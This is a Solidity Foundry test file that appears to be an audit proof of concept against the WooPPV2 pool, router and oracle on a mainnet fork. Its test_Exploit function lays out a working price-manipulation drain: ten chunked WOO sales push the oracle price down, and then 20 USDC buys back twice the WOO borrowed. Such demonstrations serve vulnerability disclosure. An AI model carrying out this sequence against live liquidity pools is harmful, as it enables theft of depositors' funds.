// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import {Greeter} from "../../contracts/Greeter.sol";
import {TestHelpers} from "./TestHelpers.sol";

import {WooPPV2} from "../../contracts/WooPPV2.sol";
import {WooRouterV2} from "../../contracts/WooRouterV2.sol";
import {WooracleV2_2} from "../../contracts/wooracle/WooracleV2_2.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import "forge-std/console.sol";

contract TestDrainPool is TestHelpers {

    WooPPV2 public pool;
    WooRouterV2 public router;
    WooracleV2_2 public oracle;

    address private constant ADMIN = address(1);
    address private constant ATTACKER = address(2);
    address private constant FEE_ADDR = address(4);
    
    // mainnet
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // QUOTE TOKEN
    address private constant WOO = 0x4691937a7508860F876c9c0a2a617E7d9E945D4B; 
    address private constant USDC_USD_ORACLE = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6; 
    address private constant ETH_USD_ORACLE = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419; 

    uint128 private constant MAX_NOTIONAL_USDC = 5000_000 * 1e18;
    uint128 private constant MAX_GAMMA = type(uint128).max;
    
    uint64 private constant INITIAL_SPREAD = 0.1 * 1e18;
    uint64 private constant INITIAL_COEFF = 0.0001 * 1e18; 
    uint64 private constant INITIAL_SPREAD_WOO = 1e12;
    uint64 private constant INITIAL_COEFF_WOO = 0.0001 * 1e18;
    uint128 private constant INITIAL_PRICE = 350089000000;
    uint128 private constant INITIAL_PRICE_WOO = 1 * 1e8;

    // deployed addresses

    function setUp() public {
        vm.startPrank(ADMIN);
        pool = new WooPPV2(USDC);
        router = new WooRouterV2(WETH, address(pool));
        oracle = new WooracleV2_2();

        oracle.setQuoteToken(USDC, USDC_USD_ORACLE);
        oracle.setCLOracle(WETH, ETH_USD_ORACLE, true);
        oracle.setWooPP(address(pool));

        oracle.postState(WETH, INITIAL_PRICE, INITIAL_SPREAD, INITIAL_COEFF);
        oracle.postState(WOO, INITIAL_PRICE_WOO, INITIAL_SPREAD_WOO, INITIAL_COEFF_WOO);
        oracle.setGuardian(ADMIN, true);
        oracle.setRange(WOO, 9000, 110000000);
        oracle.setAdmin(address(pool), true);

        pool.setWooracle(address(oracle));
        pool.setTokenInfo(WETH, 0, MAX_GAMMA, MAX_NOTIONAL_USDC);
        pool.setTokenInfo(WOO, 0, MAX_GAMMA, MAX_NOTIONAL_USDC);
        pool.setFeeAddr(FEE_ADDR);
        vm.stopPrank();
    }

    // run this command to run the test:
    // forge test --fork-url https://rpc.ankr.com/eth --match-contract TestDrainPool -vv
    function test_Exploit() public {
        // Flashloan 99989999999999999990000 (99_990) WOO
        // Sell WOO partially (in 10 pieces) assuming maxGamma | maxNotionalSwap doesnt allow us to do it in one go
        // Sell 20 USDC and get 199779801821639475527975 (199_779) WOO
        // Repay flashloan, pocket the rest of the 100K WOO. 

        // Reference values: 
        // s = 0.1, p = 1, c = 0.0001 

        // bootstrap the pool 
        uint usdcAmount = 100_0000_0_0000000000000_000;
        deal(USDC, ADMIN, usdcAmount);
        deal(WOO, ADMIN, usdcAmount);
        deal(WETH, ADMIN, usdcAmount);
        vm.startPrank(ADMIN);
        IERC20(USDC).approve(address(pool), type(uint256).max);
        IERC20(WOO).approve(address(pool), type(uint256).max);
        IERC20(WETH).approve(address(pool), type(uint256).max);
        pool.depositAll(USDC);
        pool.depositAll(WOO);
        pool.depositAll(WETH);
        vm.stopPrank();
        ////////////////////////

        // fund mr ATTACKER
        vm.startPrank(ATTACKER);
        uint wooAmountForATTACKER = 9999 * 1e18 - 1000;
        deal(WOO, ATTACKER, wooAmountForATTACKER * 10);
        IERC20(USDC).approve(address(router), type(uint256).max);
        IERC20(WOO).approve(address(router), type(uint256).max);
        IERC20(WETH).approve(address(router), type(uint256).max);
        vm.stopPrank();
        ////////////////////////
        
        // get the price before the swaps
        (uint256 price, ) = oracle.price(WOO);
        console.log("Price before the swap", price);

        // here, we assume maxGamma and maxNotionalSwap can save us. However, due to how AMM behaves
        // partial swaps in same tx will also work and it will be even more profitable! 
        uint cumulative;
        for (uint i; i < 10; ++i) {
            vm.prank(ATTACKER);
            cumulative += router.swap(WOO, USDC, wooAmountForATTACKER, 0, payable(ATTACKER), ATTACKER);
        }

        // how much we bought and what's the final swap? 
        console.log("USDC bought after swaps", cumulative);
        (price, ) = oracle.price(WOO);
        console.log("Price after swap", price);

        // sell 20 USDC, how much WOO we get? (199779801821639475527975)
        vm.prank(ATTACKER);
        uint receivedWOO = router.swap(USDC, WOO, 20 * 1e6, 0, payable(ATTACKER), ATTACKER);
        console.log("Received WOO", receivedWOO); // 199779801821639475527975 (10x)
        console.log("Total WOO flashloaned", wooAmountForATTACKER * 10); // 99989999999999999990000

        // attack is succesfull 
        assertGe(receivedWOO, wooAmountForATTACKER * 10);
    }

    function _fundAndApproveAdminAndATTACKER(uint usdcAmount, uint wethAmount) internal {
        deal(USDC, ADMIN, usdcAmount);

        vm.startPrank(ADMIN);
        IERC20(USDC).approve(address(pool), type(uint256).max);
        pool.depositAll(USDC);
        vm.stopPrank();

        assertEq(IERC20(USDC).balanceOf(address(pool)), usdcAmount);

        vm.startPrank(ATTACKER);
        deal(WETH, ATTACKER, wethAmount * 2);
        IERC20(WETH).approve(address(router), type(uint256).max);
        vm.stopPrank();
    }
}